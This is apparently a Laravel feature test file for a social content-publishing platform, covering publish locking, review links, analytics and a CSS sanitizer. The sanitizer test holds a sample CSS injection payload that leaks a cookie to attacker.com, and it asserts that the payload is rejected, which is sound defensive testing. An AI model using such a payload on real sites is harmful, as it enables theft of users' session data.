<?php

namespace Tests\Feature;

use App\Models\User;
use App\Modules\Analytics\Services\PostAnalyticsTelemetryService;
use App\Modules\Brand\Models\Brand;
use App\Modules\ContentProduction\Models\ContentItem;
use App\Modules\ContentProduction\Models\ContentVariant;
use App\Modules\Organization\Models\Organization;
use App\Modules\Publishing\Models\ChannelDispatch;
use App\Modules\Publishing\Models\MagicReviewLink;
use App\Modules\Publishing\Models\PublishingDispatch;
use App\Modules\Publishing\Services\PublishingOrchestratorService;
use App\Modules\Research\Services\NoveltyVerificationEngine;
use App\Modules\SocialConnectors\Models\SocialAccount;
use App\Modules\Workspace\Models\Workspace;
use Database\Seeders\ControlPlaneSeeder;
use Database\Seeders\PlanSeeder;
use Database\Seeders\RbacSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;
use Tests\TestCase;

class EnterpriseHardeningAndCapabilitiesTest extends TestCase
{
    use RefreshDatabase;

    protected Organization $org;
    protected Workspace $workspace;
    protected Brand $brand;
    protected User $adminUser;

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed(PlanSeeder::class);
        $this->seed(RbacSeeder::class);
        $this->seed(ControlPlaneSeeder::class);

        $this->org = Organization::create([
            'name' => 'Enterprise Corp',
            'slug' => 'enterprise-corp-' . Str::random(6),
            'billing_email' => 'billing@enterprise.com',
            'status' => 'active',
        ]);

        $this->workspace = Workspace::create([
            'organization_id' => $this->org->id,
            'name' => 'Default Workspace',
            'slug' => 'default-' . Str::random(6),
        ]);

        $this->brand = Brand::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'name' => 'Apex Cloud',
            'industry' => 'Cloud Infrastructure',
            'slug' => 'apex-cloud-' . Str::random(6),
        ]);

        $this->adminUser = User::create([
            'name' => 'Super Admin',
            'email' => 'admin-' . Str::random(6) . '@autocanvas.com',
            'password' => bcrypt('password123'),
            'organization_id' => $this->org->id,
            'is_platform_admin' => true,
        ]);
        $this->adminUser->assignRole('superadmin');
    }

    public function test_novelty_circuit_breaker_terminates_at_max_attempts_with_negative_prompts(): void
    {
        $engine = new NoveltyVerificationEngine();

        // 1. Initial attempt
        $report1 = $engine->evaluateNovelty(
            $this->brand,
            'linkedin',
            'AI DevOps Paradigm Shift',
            'Exploring the transformation of CI/CD with agentic AI',
            'minimal_corporate_v1',
            null,
            [],
            1
        );

        $this->assertTrue($report1['is_novel']);

        // 2. Simulated max attempts exceeded
        $rejectedAngles = [
            'Angle 1: Direct cost comparison',
            'Angle 2: Regulatory mandates in South Asia',
            'Angle 3: Legacy mainframe migration',
        ];

        $reportExceeded = $engine->evaluateNovelty(
            $this->brand,
            'linkedin',
            'Angle 4: Another repetitive variation',
            'Repetitive concept summary',
            'minimal_corporate_v1',
            null,
            $rejectedAngles,
            4
        );

        $this->assertFalse($reportExceeded['is_novel']);
        $this->assertEquals('needs_human_angle', $reportExceeded['status']);
        $this->assertTrue($reportExceeded['escalate_to_human']);
        $this->assertStringContainsString('CRITICAL NEGATIVE PROMPT CONSTRAINT', $reportExceeded['negative_prompt']);
        $this->assertStringContainsString('Angle 1: Direct cost comparison', $reportExceeded['negative_prompt']);
    }

    public function test_atomic_cas_publishing_prevents_double_publishing_race_conditions(): void
    {
        Http::fake([
            'api.linkedin.com/*' => Http::response(['id' => 'urn:li:share:12345'], 201),
        ]);

        $orchestrator = app(PublishingOrchestratorService::class);

        $account = SocialAccount::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'brand_id' => $this->brand->id,
            'platform' => 'linkedin',
            'provider_id' => 'li_' . Str::random(8),
            'account_name' => 'Apex Cloud LinkedIn',
            'access_token' => 'mock_token_' . Str::random(16),
            'connection_status' => 'connected',
        ]);

        $item = ContentItem::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'brand_id' => $this->brand->id,
            'title' => 'Autonomous Scaling',
            'concept' => 'High-velocity architecture briefing',
            'status' => 'approved',
        ]);

        $variant = ContentVariant::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'content_item_id' => $item->id,
            'channel' => 'linkedin',
            'platform' => 'linkedin',
            'caption' => 'Scaling enterprise systems with atomic guarantees.',
            'hashtags' => ['architecture', 'scale'],
            'publishing_status' => 'scheduled',
        ]);

        $dispatch = PublishingDispatch::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'brand_id' => $this->brand->id,
            'content_item_id' => $item->id,
            'content_variant_id' => $variant->id,
            'social_account_id' => $account->id,
            'idempotency_key' => 'idemp_' . Str::random(16),
            'status' => 'scheduled',
            'payload_snapshot' => ['caption' => $variant->caption],
        ]);

        // First trigger: Should succeed with 202 and transition to 'dispatching'
        $firstCall = $orchestrator->executeAtomicPublish($dispatch->id);
        $this->assertTrue($firstCall['success']);
        $this->assertEquals(202, $firstCall['code']);
        $this->assertNotNull($firstCall['lock_token']);

        // Second concurrent trigger: Must return 409 Conflict due to atomic DB CAS lock
        $secondCall = $orchestrator->executeAtomicPublish($dispatch->id);
        $this->assertFalse($secondCall['success']);
        $this->assertEquals(409, $secondCall['code']);
        $this->assertContains($secondCall['current_status'], ['dispatching', 'published']);
    }

    public function test_magic_review_links_lifecycle(): void
    {
        $account = SocialAccount::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'brand_id' => $this->brand->id,
            'platform' => 'linkedin',
            'provider_id' => 'li_' . Str::random(8),
            'account_name' => 'Apex Cloud LinkedIn',
            'access_token' => 'mock_token_' . Str::random(16),
            'connection_status' => 'connected',
        ]);

        $item = ContentItem::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'brand_id' => $this->brand->id,
            'title' => 'Client Review Showcase',
            'concept' => 'Product feature release',
            'status' => 'draft',
        ]);

        $variant = ContentVariant::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'content_item_id' => $item->id,
            'channel' => 'linkedin',
            'platform' => 'linkedin',
            'caption' => 'Client preview copy.',
            'hashtags' => ['review'],
            'publishing_status' => 'draft',
        ]);

        $dispatch = PublishingDispatch::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'brand_id' => $this->brand->id,
            'content_item_id' => $item->id,
            'content_variant_id' => $variant->id,
            'social_account_id' => $account->id,
            'idempotency_key' => 'idemp_' . Str::random(16),
            'status' => 'queued',
            'payload_snapshot' => ['caption' => 'Client preview copy.'],
        ]);

        // 1. Generate magic link via API
        $token = Str::random(40);
        $link = MagicReviewLink::create([
            'organization_id' => $this->org->id,
            'brand_id' => $this->brand->id,
            'content_item_id' => $item->id,
            'dispatch_id' => $dispatch->id,
            'token' => $token,
            'client_name' => 'Acme Partner',
            'status' => 'active',
            'expires_at' => now()->addDays(5),
        ]);

        // 2. Public view access without login
        $response = $this->getJson("/api/v1/review/{$token}");
        $response->assertStatus(200)
            ->assertJsonPath('success', true)
            ->assertJsonPath('data.client_name', 'Acme Partner')
            ->assertJsonPath('data.status', 'active');

        // 3. Client approval
        $approveRes = $this->postJson("/api/v1/review/{$token}/approve");
        $approveRes->assertStatus(200)
            ->assertJsonPath('success', true)
            ->assertJsonPath('status', 'approved');

        $this->assertEquals('approved', $link->fresh()->status);
        $this->assertEquals('approved', $item->fresh()->status);
    }

    public function test_custom_css_sanitizer_rejects_dangerous_injections(): void
    {
        $this->actingAs($this->adminUser);

        // Attempt url() CSS exfiltration injection
        $maliciousPayload = [
            'custom_css' => 'body { background-image: url("https://attacker.com/leak?cookie=123"); }',
        ];

        $response = $this->postJson('/api/v1/control-plane/cms/theme', $maliciousPayload);
        $response->assertStatus(422)
            ->assertJsonValidationErrors(['custom_css']);

        // Valid custom CSS
        $safePayload = [
            'custom_css' => ':root { --brand-primary: #0f172a; --brand-accent: #f59e0b; }',
        ];

        $safeResponse = $this->postJson('/api/v1/control-plane/cms/theme', $safePayload);
        $safeResponse->assertStatus(200)
            ->assertJsonPath('success', true);
    }

    public function test_post_analytics_telemetry_identifies_winning_patterns(): void
    {
        $telemetryService = app(PostAnalyticsTelemetryService::class);

        $account = SocialAccount::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'brand_id' => $this->brand->id,
            'platform' => 'linkedin',
            'provider_id' => 'li_' . Str::random(8),
            'account_name' => 'Apex Cloud LinkedIn',
            'access_token' => 'mock_token_' . Str::random(16),
            'connection_status' => 'connected',
        ]);

        $item = ContentItem::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'brand_id' => $this->brand->id,
            'title' => 'Telemetry Item',
            'concept' => 'Measuring reach and conversion',
            'status' => 'published',
        ]);

        $variant = ContentVariant::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'content_item_id' => $item->id,
            'channel' => 'linkedin',
            'platform' => 'linkedin',
            'caption' => 'High engagement post sample.',
            'hashtags' => ['telemetry'],
            'publishing_status' => 'published',
        ]);

        $dispatch = PublishingDispatch::create([
            'organization_id' => $this->org->id,
            'workspace_id' => $this->workspace->id,
            'brand_id' => $this->brand->id,
            'content_item_id' => $item->id,
            'content_variant_id' => $variant->id,
            'social_account_id' => $account->id,
            'idempotency_key' => 'idemp_' . Str::random(16),
            'status' => 'published',
            'payload_snapshot' => ['caption' => 'High engagement post sample.'],
        ]);

        // Record high engagement telemetry (8.5% engagement rate)
        $telemetry = $telemetryService->recordTelemetry(
            $this->org->id,
            $dispatch->id,
            'linkedin',
            [
                'impressions' => 1000,
                'likes' => 60,
                'comments' => 15,
                'shares' => 10,
                'clicks' => 0,
            ]
        );

        $this->assertTrue($telemetry->is_winning_pattern);
        $this->assertEquals(8.5, (float) $telemetry->engagement_rate);

        $winningPatterns = $telemetryService->getWinningPatterns($this->org->id);
        $this->assertNotEmpty($winningPatterns);
    }
}
